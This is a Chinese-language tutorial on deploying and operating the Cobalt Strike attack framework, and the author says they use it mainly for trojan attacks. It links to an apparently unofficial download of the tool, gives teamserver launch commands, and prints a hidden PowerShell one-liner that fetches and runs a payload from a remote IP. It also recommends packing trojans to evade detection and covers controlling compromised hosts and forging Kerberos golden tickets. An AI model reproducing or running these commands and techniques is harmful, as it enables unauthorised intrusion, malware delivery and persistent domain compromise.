是一个团队使用的 渗透框架

我们其实一般就是用于木马攻击等

# 安装

我们需要安装 Java8的 不然会导致无法执行 本地需要安装Java8

```
https://www.java.com/en/download/manual.jsp
```

```
通过网盘分享的文件：CobaltStrike
链接: https://pan.baidu.com/s/1U3ZfP9JpoIv5vH3CExKI5A?pwd=ykgr 提取码: ykgr 
--来自百度网盘超级会员v6的分享
```

下载完毕后把Server上传到服务器中

```
cd Server
chmod 777 *
./teamserver  服务器IP 密码
```

![image-20260322092501546](https://raw.githubusercontent.com/Xioaruan912/pic/main/image-20260322092501546.png)

这样就基本实现了

如果我们要挂起 那么就执行

```
nohup ./teamserver 服务器IP 密码 &
```

这样就会一直加载在服务器中

# 构建监听器

内置监听器为` Beacon` 外置监听器为`Foreign`

其中`Beacon`支持异步通信和交互通信

构建监听器如下面动图所示

![Capturer_2026-03-22_092836_883](https://raw.githubusercontent.com/Xioaruan912/pic/main/Capturer_2026-03-22_092836_883.gif)

其中`Foreign` 一般是和` MSF`的联动

# 本地加载插件

CS强大 就是强大在可以加载许多的插件

![Capturer_2026-03-22_093440_395](https://raw.githubusercontent.com/Xioaruan912/pic/main/Capturer_2026-03-22_093440_395.gif)

这个就是演示 报错是因为我已经导入了

# 主动攻击

![image-20260322094158803](https://raw.githubusercontent.com/Xioaruan912/pic/main/image-20260322094158803.png)

默认存在这几个

`web投递` ：在VPS上开启一个服务 用于下载木马

![image-20260322094322584](https://raw.githubusercontent.com/Xioaruan912/pic/main/image-20260322094322584.png)

```
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://103.117.120.98:9999/a'))"
```

构建后我们就可以直接去 目标地址下载木马

![image-20260322094418559](https://raw.githubusercontent.com/Xioaruan912/pic/main/image-20260322094418559.png)

```
签名Applet攻击：诱导用户运行带签名的恶意 Java 程序 （Applet 技术基本被淘汰）
智能Applet攻击：更自动化/智能化的 Applet 利用方式 （Applet 技术基本被淘汰）
信息收集：渗透测试中最基础也最重要的一步
邮件钓鱼：构造伪造邮件诱导用户点击或输入信息
```

其实这些也不是我们常用的

# 有效载荷

这里才是我们的重头戏 CS支持非常丰富的木马 他会生成最基本的木马 我们只需要对基本木马加上壳 就可以混淆从而保证命令的执行

![image-20260322094932334](https://raw.githubusercontent.com/Xioaruan912/pic/main/image-20260322094932334.png)

目前我们只使用 `Payload生成器`

`HTA = HTML Application` ：本质是一个可以在 Windows 上当程序运行的 HTML 文件，内嵌脚本（VBScript / JavaScript）执行命令

`Office宏`：利用 Word / Excel 里的宏

`Payload生成器`：用来生成各种攻击载荷（payload）

`有效载荷生成器`：` Stageless `= 无阶段 所有功能一次性打包进 payload 不需要再从远程下载第二阶段代码

下面的windows可执行也是如此 是否网络拉取和无阶段的一次性

# 对被控主机的操作

![image-20260322100013882](https://raw.githubusercontent.com/Xioaruan912/pic/main/image-20260322100013882.png)

这里其实就是所有的我们可以操作的地方

我们首先生成一个基本的木马 传入目的主机

![image-20260322100120442](https://raw.githubusercontent.com/Xioaruan912/pic/main/image-20260322100120442.png)

我们可以对目标主机右键检查 有什么操作

![image-20260322100220598](https://raw.githubusercontent.com/Xioaruan912/pic/main/image-20260322100220598.png)

会话交互就是类似`Meterpreter` 可以直接通过`shell` 建立命令行交互

回连间隔就是木马和我们的通信 最好设置30左右

下面那些就是基本操作和一些插件

# 生成黄金票据

 Windows 域 攻击中的高级权限持久化手段

在域环境中 用户登入 会从域控 获得一个通行证`TGT` 那么如果攻击者获得到`KRBTGT账户的密码哈希`

那么就可以伪造自己的`TGT` 假装成任何用户 访问整个域里的资源

生成的前提是我们已经获得了` KRBTGT`用户的哈希

主要是在域控中了

使用`shellklist` 可以展示我们当前所拥有的票据
